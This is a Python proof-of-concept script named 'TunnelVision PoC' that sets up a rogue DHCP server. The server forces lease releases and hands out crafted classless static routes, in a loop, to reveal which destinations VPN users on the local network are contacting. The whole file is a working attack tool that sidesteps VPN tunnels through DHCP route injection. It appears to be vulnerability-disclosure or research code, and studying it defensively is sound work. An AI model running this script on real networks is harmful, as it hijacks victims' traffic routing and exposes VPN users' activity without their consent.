#!/usr/bin/env python3
from arcane.network.interface import NetworkInterface
from arcane.dhcp.server import DHCPServer
from arcane.dhcp.subleaser import DHCPSubleaser
from arcane.dhcp.releaser import DHCPReleaser
from arcane.runtime import RUNTIME
from arcane.events import DHCPServerEvent, ARPTableEvent, DHCPReleaseEvent
import ipaddress
import logging
import argparse
import time


parser = argparse.ArgumentParser(prog='TunnelVision PoC', description='Decloaks VPN users on the LAN')
parser.add_argument('-i', '--interface', help="Interface to listen on", required=True)
parser.add_argument('-s', '--server', help="Interface to listen on", required=True)
parser.add_argument('-t', '--target', action='append', help="Target destinations to check for. May be listed more than once")
parser.add_argument('-l', '--lease-time', type=int, default=10, help="Lease duration")
parser.add_argument('-v', '--verbose', action="store_true", help="Print DEBUG messages to console")


def build_routes(targets: list):
    negative_routes = [ipaddress.IPv4Network('0.0.0.0/0')]
    for target in targets:
        temp_routes = [r for r in negative_routes]
        for route in negative_routes:
            try:
                temp_routes.extend(route.address_exclude(ipaddress.IPv4Network(target)))
            except ValueError:
                temp_routes.append(route)
        
        negative_routes = temp_routes
    
    return [str(r) for r in negative_routes]


def main():
    args = parser.parse_args()
    logging.root.setLevel(logging.DEBUG if args.verbose else logging.INFO)

    RUNTIME.event_manager.log_filter.allowlist_events.add(DHCPServerEvent.LEASE_OFFERED)
    RUNTIME.event_manager.log_filter.allowlist_events.add(ARPTableEvent.ENTRY_CHANGED)
    RUNTIME.event_manager.log_filter.allowlist_events.add(DHCPReleaseEvent.LEASE_RELEASED)
    
    interface       = NetworkInterface(args.interface)
    negative_routes = {
        'classless_static_routes': [f'{r}:{interface.ip_address}' for r in build_routes(args.target)],
        'lease_time': args.lease_time
    }

    all_traffic = {
        'lease_time': args.lease_time
    }

    server   = DHCPServer(interface, DHCPSubleaser(interface), **all_traffic)
    releaser = DHCPReleaser(interface, server.lease_generator, args.server, sweep_time=5)

    while True:
        time.sleep(args.lease_time)
        server.options = negative_routes
        time.sleep(args.lease_time)
        server.options = all_traffic


    interface.thread.join()



if __name__ == "__main__":
    main()
